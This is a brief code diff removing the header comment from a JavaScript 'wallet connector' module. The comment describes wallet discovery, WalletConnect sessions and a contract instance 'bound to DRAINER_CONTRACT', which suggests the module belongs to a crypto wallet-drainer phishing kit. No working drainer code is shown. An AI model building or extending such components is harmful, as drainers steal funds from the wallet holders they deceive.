@@ -1,26 +1,3 @@
-// ============================================================================
-//  Apex Protocol — Wallet Connector
-//  ---------------------------------------------------------------------------
-//  Responsibilities:
-//    1. Discover injected EVM wallets (EIP-6963 + legacy window.ethereum)
-//    2. Connect via WalletConnect v2 (mobile-first, deep-link aware)
-//    3. Publish window.__apexConnected for script.js to consume
-//    4. Persist + restore sessions across reloads
-//
-//  Publishes:
-//    window.__apexConnected = {
-//      address,        // 0x… selected account
-//      chain,          // 'evm' | 'bitcoin' | 'solana'
-//      web3,           // Web3 instance
-//      contract,       // Contract instance bound to DRAINER_CONTRACT
-//      provider,       // Live EIP-1193 provider (critical for WC signing)
-//      session,        // WalletConnect session object, if any
-//      publishedAt,    // ms timestamp of publication
-//    }
-//
-//  Fires: window 'apex:connected' CustomEvent when state changes.
-// ============================================================================
-
 import { CONFIG } from './config.js';
 
 ;(async function () {
